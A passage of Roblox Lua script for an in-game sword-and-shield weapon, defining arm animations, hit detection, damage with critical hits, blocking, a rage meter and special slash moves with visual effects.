RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
RWRem()
attack = false
end
function equipanim()
attack = true
RWFunc()
for i = 0 , 1 ,0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(200*i),math.rad(60*i),0)
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
equipweld()
LWFunc()
uss(Head,1)
for i = 0 , 1 ,0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(200-110*i),math.rad(60-15*i),math.rad(45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45*i),math.rad(-45*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0)
end
for i = 0 , 1 ,0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(45),math.rad(45-45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0)
end
attack = false
end
if (script.Parent.className ~= "HopperBin") then 
Tool = Instance.new("HopperBin") 
Tool.Parent = Backpack 
Tool.Name = ToolName
script.Parent = Tool 
end 
Bin = Tool
function damagesplat(dmg,hit,crit,blocked)
    local mo = Instance.new("Model")
    mo.Name = dmg
    local pa = Instance.new("Part",mo)
    pa.formFactor = 3
    pa.Size = Vector3.new(0.8,0.3,0.8)
    if crit then
    pa.BrickColor = BrickColor.new("Bright yellow")
    elseif not crit then
    pa.BrickColor = BrickColor.new("Bright red")
    end
    if blocked then pa.BrickColor = BrickColor.new("Bright blue") end
    pa.CFrame = CFrame.new(hit.Position) * CFrame.new(0, 3, 0)
    pa.Name = "Head"
    local hah = Instance.new("Humanoid")
    hah.Parent = mo
    hah.MaxHealth = 0
    hah.Health = 0
    local bp = Instance.new("BodyPosition")
    bp.P = 14000
    bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
    bp.position = hit.Position + Vector3.new(0, 5, 0)
    coroutine.resume(coroutine.create(function()
        wait()
        mo.Parent = workspace
        bp.Parent = pa
        wait(1.4)
        mo:remove()
    end))
end
function damage(hum,dmg,critornot)
damagesplat(dmg,hum.Torso,critornot)
hum:TakeDamage(dmg)
coroutine.resume(coroutine.create(function()
tagHumanoid(hum,Player)
wait(1)
untagHumanoid(hum)
end))
end
function AddRage(add)
Rage = Rage + add
if Rage > MaxRage then
Rage = MaxRage
end
end
function OT(hit) --Normal Damage
if Hitdeb == 1 then return end
if hit.Parent == nil then return end
local hum = hit.Parent:findFirstChild("Humanoid") if hum ~= nil and hum ~= Character.Humanoid then
if hum.Health <= 0 then return end
if hit.Parent:findFirstChild("Block") ~= nil then 
if hit.Parent.Block.Value then 
damagesplat(0,hum.Torso,false,true)
AddRage(5) 
Hitdeb = 1
if hit.Parent.Block:findFirstChild("BlockPower") ~= nil then
if hit.Parent.Block.BlockPower.Value <= 1 then
hit.Parent.Block.Value = false 
elseif hit.Parent.Block.BlockPower.Value > 1 then
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker 
elseif critrandomizer == 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker + 2
end
end
end
return end end
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage,maxdamage)
damage(hum,rndmdamage,false)
AddRage(rndmdamage/2)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage,crtmaxdamage)
damage(hum,rndmdamage,true)
AddRage(rndmdamage/2)
end
Hitdeb = 1
end
end
function OT2(hit) --Bash Damage
if Hitdeb == 1 then return end
if hit.Parent == nil then return end
local hum = hit.Parent:findFirstChild("Humanoid") if hum ~= nil and hum ~= Character.Humanoid then
if hum.Health <= 0 then return end
local vel = Instance.new("BodyVelocity",hum.Torso)
vel.maxForce = Vector3.new(1,1,1) * math.huge
vel.P = vel.P * 2
vel.velocity = Vector3.new(0,2,0) + CFrame.new(Torso.Position,hum.Torso.Position).lookVector * 75
coroutine.resume(coroutine.create(function()
wait(0.1)
vel.Parent=nil
end))
if hit.Parent:findFirstChild("Block") ~= nil then 
if hit.Parent.Block.Value then 
damagesplat(0,hum.Torso,false,true)
AddRage(5) 
Hitdeb = 1
if hit.Parent.Block:findFirstChild("BlockPower") ~= nil then
if hit.Parent.Block.BlockPower.Value <= 1 then
hit.Parent.Block.Value = false 
elseif hit.Parent.Block.BlockPower.Value > 1 then
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker 
elseif critrandomizer == 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker + 2
end
end
end
return end end
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage,maxdamage)
damage(hum,rndmdamage,false)
AddRage(rndmdamage/2)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage,crtmaxdamage)
damage(hum,rndmdamage,true)
AddRage(rndmdamage/2)
end
Hitdeb = 1
end
end
function OTNR(hit) --No rage Damage
if Hitdeb == 1 then return end
if hit.Parent == nil then return end
local hum = hit.Parent:findFirstChild("Humanoid") if hum ~= nil and hum ~= Character.Humanoid then
if hit.Parent:findFirstChild("Block") ~= nil then 
if hit.Parent.Block.Value then 
damagesplat(0,hum.Torso,false,true)
AddRage(5) 
Hitdeb = 1
if hit.Parent.Block:findFirstChild("BlockPower") ~= nil then
if hit.Parent.Block.BlockPower.Value <= 1 then
hit.Parent.Block.Value = false 
elseif hit.Parent.Block.BlockPower.Value > 1 then
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker 
elseif critrandomizer == 1 then
hit.Parent.Block.BlockPower.Value = hit.Parent.Block.BlockPower.Value - blockbreaker + 2
end
end
end
return end end
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage,maxdamage)
damage(hum,rndmdamage,false)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage,crtmaxdamage)
damage(hum,rndmdamage,true)
end
Hitdeb = 1
end
end
function AoE(p,magnitude) 
        local c = game.Workspace:GetChildren();
        for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
                local head = c[i]:findFirstChild("Head");
                if head ~= nil then
                local mag = (head.Position - p).magnitude;
                if mag <= magnitude and c[i].Name ~= Character.Name then
                local foundd = false
                for ii = 1 , #AoETrue do
                if AoETrue[ii] == c[i].Name then
                foundd = true
                end
                end
                if foundd then
                end
                --
                if not foundd then
local critrandomizer = math.random(crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage,maxdamage) + bonusdmg
damage(hum,rndmdamage,false)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage,crtmaxdamage) + bonusdmg
damage(hum,rndmdamage,true)
end
                table.insert(AoETrue,c[i].Name)
                end
                end
                end
                end
        end
                for ii = 1 , #AoETrue do
                table.remove(AoETrue,#AoETrue)
                end
end
--
--
function effect(Color,Ref,LP,P1)
local effectsmsh = Instance.new("BlockMesh")
effectsmsh.Scale = Vector3.new(1,1,1)
effectsmsh.Name = "Mesh"
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "Eff"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Size = Vector3.new(0.2,1,0.2)
effectsg.Parent = swordholder
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new(Color)
effectsg.Reflectance = Ref
local point1 = P1
local mg = (LP.p - point1.p).magnitude
effectsg.Size = Vector3.new(0.2,mg,0.2)
effectsg.CFrame = CFrame.new((LP.p+point1.p)/2,point1.p) * CFrame.Angles(math.rad(90),0,0)
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
effectsmsh.Scale = Vector3.new(1-1*i,1,1-1*i)
end
wait()
effectsg.Parent = nil
end))
end
--
con = nil
function dmgcnnct()
if con ~= nil then
con:disconnect()
Hitdeb = 0
end
con = prt4.Touched:connect(OT)
end
function shldcnnct()
if con ~= nil then
con:disconnect()
Hitdeb = 0
end
con = prt7.Touched:connect(OT2)
end
function nrdmgcnnct()
if con ~= nil then
con:disconnect()
Hitdeb = 0
end
con = prt4.Touched:connect(OTNR)
end
function dmgdc()
if con ~= nil then
con:disconnect()
Hitdeb = 0
end
end
function rptddmg(value,des,inc)
coroutine.resume(coroutine.create(function()
repeat
wait(inc)
Hitdeb = 0
until value == des
end))
end
function atktype(s,e)
coroutine.resume(coroutine.create(function ()
attacktype = e
wait(0.25)
attacktype = s
end))
end
local bl = false
local bll = false
function Guard()
attack = true
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(45-90*i),math.rad(45-90*i),0)
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5+1*i, 0.5, -1*i) * CFrame.Angles(math.rad(45+45*i),math.rad(-45+45*i),math.rad(90*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
blk.Value = true
ms(Head,1.5)
repeat 
wait(0.1) 
until not buttonhold or not blk.Value
blk.Value = false
if blkc.Value < 1 then
local T = Instance.new("Part")
T.formFactor = 0
T.CanCollide = false
T.Name = "FakeTorso"
T.Locked = true
T.Size = Torso.Size
T.Parent = swordholder
T.Transparency = 1
T.BrickColor = Torso.BrickColor
for i,z in pairs(Character:GetChildren()) do
if z.className == "CharacterMesh" then
if z.BodyPart == Enum.BodyPart.Torso then
local SM = Instance.new("SpecialMesh",T)
SM.MeshId = "http://www.roblox.com/asset/?id=" .. z.MeshId
if z.BaseTextureId ~= 0 then
SM.TextureId = z.BaseTextureId
elseif z.OverlayTextureId ~= 0 then
SM.TextureId = z.OverlayTextureId
else
SM.TextureId = ""
end
end
end
end
local wt = Instance.new("Weld")
wt.Parent = T
wt.Part0 = T
wt.Part1 = Torso
RW.Part0 = T
LW.Part0 = T
T.Transparency = 0
Torso.Transparency = 1
RHL.Part0 = T
LHL.Part0 = T
uss(Head,0.5)
bll = true
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(-45),math.rad(45*i)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-0.5, 0.5, -1) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(45*i), 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(45*i), 0) 
end
if bl then
Rage = Rage - 20
ss(Head,1)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+135*i),math.rad(-45-45*i),math.rad(45-45*i)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-90*i), 0, 0)
LW.C0 = CFrame.new(-0.5-1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90-45*i),math.rad(-45*i),math.rad(90-135*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(45-45*i), 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(45-45*i), 0) 
end 
dmgcnnct()
LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5-1*i, 0.5, -1*i) * CFrame.Angles(math.rad(90-20*i),math.rad(-90),math.rad(0)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-90+180*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),math.rad(-45))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(-90*i), 0) 
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end 
for i = 0 , 1 , 0.4 do
wait()
RW.C0 = CFrame.new(0.5, 0.5, -1) * CFrame.Angles(math.rad(70),math.rad(-90),math.rad(0)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(90+10*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),math.rad(-45))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(-90-10*i), 0) 
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end 
dmgdc()
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(0.5+1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(70-25*i),math.rad(-90+135*i),math.rad(0)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-100*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),math.rad(-45+45*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(-100+100*i), 0) 
end 
end
if not bl then
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(-45),math.rad(45+20*i)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-0.5, 0.5, -1) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(45+20*i), 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(45+20*i), 0) 
end 
wait()
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(-45+90*i),math.rad(65-65*i)) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-0.5-1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90-45*i),math.rad(-45*i),math.rad(90-90*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(65-65*i), 0, 0)
wt.C0 = CFrame.Angles(0, math.rad(65-65*i), 0) 
end 
end
bll = false
RHL.Part0 = Torso
LHL.Part0 = Torso
RW.Part0 = Torso
LW.Part0 = Torso
T.Parent = nil
Torso.Transparency = 0
elseif blkc.Value >= 1 then
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(-45+90*i),0)
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-0.5-1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90-45*i),math.rad(-45*i),math.rad(90-90*i))
end
end
blkc.Value = blockpower
attack = false
bl = false
bll = false
end
function Slash1()
attack = true
ss(Head,1)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(45+90*i),math.rad(45-90*i),math.rad(45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
dmgcnnct()
LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5-1*i, 0.5, -1*i) * CFrame.Angles(math.rad(135-135*i),math.rad(-45+90*i),math.rad(45-90*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
dmgdc()
atktype(1,2)
attack = false
for i = 0 , 1 , 0.1 do
if attack then return end
wait()
RW.C0 = CFrame.new(0.5+1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(45*i),math.rad(45),math.rad(-45+45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45),math.rad(-45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
end
function Slash2()
attack = true
ss(Head,2)
for i = 0 , 1 , 0.15 do
wait()
RW.C0 = CFrame.new(0.5, 0.5, -1) * CFrame.Angles(math.rad(90*i),math.rad(45+45*i),math.rad(-45+45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-45*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45-90*i),math.rad(-45+90*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
dmgcnnct()
LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(0.5+1*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90),math.rad(90),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(-45+180*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
dmgdc()
atktype(1,3)
attack = false
for i = 0 , 1 , 0.2 do
if attack then return end
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90),math.rad(90),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(135+20*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(45),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
for i = 0 , 1 , 0.1 do
if attack then return end
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(90-45*i),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(155-155*i), 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(45-90*i),0)
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
end
function Slash3()
attack = true
ss(Head,1.5)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(90-135*i),math.rad(90-135*i),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(155-155*i), 0, 0)
LW.C0 = CFrame.new(-1.5+1.5*i, 0.5, -1*i) * CFrame.Angles(math.rad(-45+135*i),math.rad(45-45*i),math.rad(90*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
shldcnnct()
LastPoint = LeftArm.CFrame * CFrame.new(0,LeftArm.Size.Y/-2,0)
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(-45),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90-180*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = LeftArm.CFrame * CFrame.new(0,LeftArm.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45),math.rad(-45),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-90-20*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
local Point = LeftArm.CFrame * CFrame.new(0,LeftArm.Size.Y/-2,0)
effect("White",0.5,LastPoint,Point)
LastPoint = Point
end
dmgdc()
for i = 0 , 1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(-45+90*i),math.rad(-45+90*i),math.rad(0))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(90-45*i),math.rad(-45*i),math.rad(-110+110*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
end
attack = false
end
function Powerslash()
if Rage < 15 then return end
Rage = Rage - 15
attack = true
ss(Head,1)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1.5-0.5*i, 0.5+1*i, -0.5*i) * CFrame.Angles(math.rad(45+90*i),math.rad(45-45*i),math.rad(-45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5+0.5*i, 0.5+1*i, -0.5*i) * CFrame.Angles(math.rad(45+90*i),math.rad(-45+45*i),math.rad(45*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90-45*i)) * CFrame.new(0, 0, 0)
end
LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
subdmg(-10)
nrdmgcnnct()
ms(Head,0.5)
for i = 0 , 1 , 0.2 do 
wait()
RW.C0 = CFrame.new(1, 1.5-1*i, -0.5-0.5*i) * CFrame.Angles(math.rad(135-90*i),math.rad(0),math.rad(-45))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1, 1.5-1*i, -0.5-0.5*i) * CFrame.Angles(math.rad(135-90*i),math.rad(0),math.rad(45))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(90*i), math.rad(45)) * CFrame.new(0, 0, 0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
effect("Bright red",0.5,LastPoint,Point)
local mesh = Instance.new("SpecialMesh")
mesh.Scale = Vector3.new(1,1,1)
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 3
shell.Size = Vector3.new(0.2,0.2,0.2)
shell.CFrame = CFrame.new(LastPoint.p,Point.p) * CFrame.Angles(math.rad(90),0,0)
shell.Parent = swordholder
shell.Transparency = 1
shell.Reflectance = 0.2
shell.BrickColor = BrickColor.new("Bright red")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1-1*i
mesh.Scale = Vector3.new(1+0.5*i,1+0.5*i,1+0.5*i)
end
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1*i
mesh.Scale = Vector3.new(1.5+1*i,1.5+1*i,1.5+1*i)
end
shell.Parent = nil
end))
LastPoint = Point
end
dmgdc()
returndmg()
wait(0.15)
for i = 0 , 1 , 0.1 do
wait()
RW.C0 = CFrame.new(1+0.5*i, 0.5,-1+1*i) * CFrame.Angles(math.rad(45),math.rad(45*i),math.rad(-45+45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1-0.5*i, 0.5, -1+1*i) * CFrame.Angles(math.rad(45),math.rad(-45*i),math.rad(45-45*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(90-90*i), math.rad(45+45*i)) * CFrame.new(0, 0, 0)
end
attack = false
end
function Upperslash()
if Rage < 25 then return end
Rage = Rage - 25
attack = true
local T = Instance.new("Part")
T.formFactor = 0
T.CanCollide = false
T.Name = "FakeTorso"
T.Locked = true
T.Size = Torso.Size
T.Parent = swordholder
T.Transparency = 1
T.BrickColor = Torso.BrickColor
for i,z in pairs(Character:GetChildren()) do
if z.className == "CharacterMesh" then
if z.BodyPart == Enum.BodyPart.Torso then
local SM = Instance.new("SpecialMesh",T)
SM.MeshId = "http://www.roblox.com/asset/?id=" .. z.MeshId
if z.BaseTextureId ~= 0 then
SM.TextureId = z.BaseTextureId
elseif z.OverlayTextureId ~= 0 then
SM.TextureId = z.OverlayTextureId
else
SM.TextureId = ""
end
end
end
end
local wt = Instance.new("Weld")
wt.Parent = T
wt.Part0 = T
wt.Part1 = Torso
RW.Part0 = T
LW.Part0 = T
T.Transparency = 0
Torso.Transparency = 1
RHL.Part0 = T
LHL.Part0 = T
local LastPoint = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
for i = 0 ,1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(45-90*i),math.rad(45-45*i),math.rad(45*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(45+45*i),math.rad(-45+45*i),math.rad(45*i))
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
w1.C0 = CFrame.Angles(math.rad(-90), math.rad(0), math.rad(90+180*i)) * CFrame.new(0, 0, 0)
wt.C0 = CFrame.Angles(0,math.rad(45*i),0)
local Point = prt4.CFrame * CFrame.new(0,prt4.Size.Y/-2,0)
-- 
local mesh = Instance.new("SpecialMesh")
mesh.Scale = Vector3.new(1,1,1)
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 3
shell.Size = Vector3.new(0.2,0.2,0.2)
shell.CFrame = CFrame.new(LastPoint.p,Point.p) * CFrame.Angles(math.rad(90),0,0)
shell.Parent = swordholder
shell.Transparency = 1
shell.Reflectance = 0.2
shell.BrickColor = BrickColor.new("Bright red")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1-1*i
mesh.Scale = Vector3.new(1+0.5*i,1+0.5*i,1+0.5*i)
end
for i = 0 ,1,0.2 do
wait()
shell.Transparency = 1*i
mesh.Scale = Vector3.new(1.5+1*i,1.5+1*i,1.5+1*i)
end
shell.Parent = nil
end))
--
LastPoint = Point
end
local HIT = false
local humh = nil
local conn = prt4.Touched:connect(function(hit)
if hit.Parent == nil then return end
local hum = hit.Parent:findFirstChild("Humanoid") if hum ~= nil and hum ~= Character.Humanoid then
if hum.Health <= 0 then return end
humh = hum
HIT = true
local vel = Instance.new("BodyVelocity",hum.Torso)
vel.maxForce = Vector3.new(1,1,1) * math.huge
vel.P = vel.P * 2
vel.velocity = Vector3.new(0,75,0) + CFrame.new(Torso.Position,hum.Torso.Position).lookVector * 10
coroutine.resume(coroutine.create(function()
wait(0.2)
vel.Parent=nil
end))
end
end)
subdmg(-20)
nrdmgcnnct()
ss(Head,2)
wait(0.1)
for i = 0 ,1 , 0.2 do
wait()
RW.C0 = CFrame.new(1.5-1*i, 0.5, -1*i) * CFrame.Angles(math.rad(-45+180*i),math.rad(0),math.rad(45-90*i))
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(0, 0, 0)
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(90-135*i),math.rad(0),math.rad(45-90*i))
